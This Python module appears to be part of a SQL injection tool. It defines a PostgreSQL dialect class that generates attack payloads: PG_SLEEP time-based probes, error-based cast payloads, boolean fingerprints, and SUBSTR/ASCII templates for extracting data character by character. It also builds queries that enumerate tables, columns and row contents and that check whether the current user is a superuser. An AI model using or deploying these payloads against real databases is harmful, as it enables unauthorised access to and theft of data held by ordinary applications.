"""PostgreSQL 方言"""
from dbms.base import BaseDialect


class PostgreSQLDialect(BaseDialect):
    name = "postgresql"

    def version_expr(self): return "VERSION()"
    def database_expr(self): return "CURRENT_DATABASE()"
    def current_user_expr(self): return "CURRENT_USER"
    def is_dba_expr(self): return "(SELECT usesuper FROM pg_user WHERE usename=CURRENT_USER)"

    def tables_query(self, db_name, idx):
        return (f"SELECT table_name FROM information_schema.tables "
                f"WHERE table_schema='public' LIMIT 1 OFFSET {idx}")

    def columns_query(self, table_name, db_name, idx):
        return (f"SELECT column_name FROM information_schema.columns "
                f"WHERE table_name='{table_name}' LIMIT 1 OFFSET {idx}")

    def column_types_query(self, table_name, db_name, idx):
        return (f"SELECT data_type FROM information_schema.columns "
                f"WHERE table_name='{table_name}' LIMIT 1 OFFSET {idx}")

    def data_query(self, table_name, column, idx):
        return f"SELECT {column} FROM {table_name} LIMIT 1 OFFSET {idx}"

    def substr_templates(self):
        return ["SUBSTR(({sql}),{pos},{len})", "SUBSTRING(({sql}),{pos},{len})"]

    def ascii_templates(self):
        return ["ASCII(({sql}))"]

    def length_templates(self):
        return ["LENGTH(({sql}))", "CHAR_LENGTH(({sql}))"]

    def concat_templates(self):
        return ["(({a})||({b})||({c}))", "CONCAT({a},{b},{c})"]

    def hex_to_str(self, hexstr):
        # PG 不认 0x..，用 DECODE 解出 bytea 再按 UTF8 转文本
        return f"CONVERT_FROM(DECODE('{hexstr}','hex'),'UTF8')"

    def sleep_expr(self, seconds):
        return f"(SELECT 1 FROM PG_SLEEP({seconds}))"

    def sleep_expr_variants(self, seconds):
        return [
            f"(SELECT 1 FROM PG_SLEEP({seconds}))",
            f"PG_SLEEP({seconds})",
            f"(SELECT COUNT(*) FROM PG_SLEEP({seconds}))",
        ]

    def error_payloads(self, inner):
        return [
            f"CAST(({inner}) AS INT)",
            f"(SELECT 1/(CASE WHEN ({inner}) IS NOT NULL THEN 0 ELSE 1 END))",
            f"CAST(({inner}) AS BOOLEAN)",
        ]

    def error_fingerprints(self):
        return ["CAST(VERSION() AS INT)"]

    def error_keywords(self):
        return ["PostgreSQL", "PG::"]

    def boolean_fingerprints(self):
        # 只留本 DBMS 独有的判据（pg_tables）；原来那条 `1=1` 在任何库上都成立，不具区分度。
        return ["(SELECT COUNT(*) FROM pg_tables)>0"]